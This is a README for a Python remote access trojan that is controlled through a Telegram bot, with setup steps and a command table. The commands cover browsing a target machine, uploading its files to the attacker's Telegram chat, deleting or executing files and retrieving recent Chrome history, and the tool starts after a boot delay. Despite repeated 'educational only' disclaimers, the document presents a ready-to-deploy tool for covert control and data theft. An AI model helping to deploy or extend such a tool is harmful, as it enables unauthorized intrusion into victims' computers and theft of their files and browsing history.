RAT Downloader

RAT Downloader is a Python-based tool designed strictly for educational purposes. It allows remote interaction with files on a target machine via Telegram.

⚠️ WARNING: This tool is intended strictly for educational purposes and authorized testing only. Do not use this on systems without explicit permission. You are solely responsible for any misuse.

Features

Download and upload files

Browse directories

View Chrome browser history

Execute commands remotely

Requirements

Python 3.8+

Telegram bot token

Telegram chat ID

Internet connection

Python dependencies:

pip install -r requirements.txt


requirements.txt should include:

requests


Your config.py should contain:

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/"

Files

main.py → Main bot script

config.py → Telegram bot configuration

requirements.txt → Python dependencies

Usage

Clone the repository:

git clone https://github.com/cmdkill3r/RAT-Downloader.git
cd RAT-Downloader


Install dependencies:

pip install -r requirements.txt


Configure your bot credentials in config.py.

Run the bot:

python main.py


After a 5-minute boot delay, the bot will start. Interact with it by sending commands via Telegram.

Commands
Command	Description
pwd	Show current working directory
ls	List files and folders
cd <dir>	Change directory
upload <file>	Upload file to Telegram
send <file>	Alias of upload
cp <src> <dst>	Copy file
mv <src> <dst>	Move or rename file
rm <file>	Delete file
mkdir <folder>	Create folder
run/exec <file>	Execute file
cat <file>	Show first 4k characters of a file
head <file> [n]	Show first n lines of a file
tail <file> [n]	Show last n lines of a file
history chrome	Retrieve last 12h of Chrome history
exit	Shut down bot
Legal & Educational Notice

This tool is strictly educational. Using it on computers without explicit authorization is illegal and may result in criminal and civil penalties.

By using this software, you acknowledge that you understand the risks and assume full responsibility for its use.

License

This project is licensed under the MIT License.

MIT License

Copyright (c) 2025 cmdkill3r

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Author

GitHub: cmdkill3r

Purpose: Educational only
